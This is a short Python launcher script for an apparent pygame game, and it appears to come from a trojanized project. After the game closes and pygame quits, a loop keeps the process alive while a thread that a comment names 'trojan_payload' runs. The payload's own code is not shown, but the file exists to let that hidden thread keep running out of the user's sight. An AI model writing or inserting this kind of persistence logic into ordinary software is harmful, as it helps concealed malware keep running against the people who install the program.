import pygame as pg
from source.main import main
import threading 
import time      

if __name__ == '__main__':
    main() # When game is closed, execution returns here
    pg.quit()
    
    # This loop keeps the process alive as long as the non-daemon trojan_payload thread is running.
    while threading.active_count() > 1:
        time.sleep(1)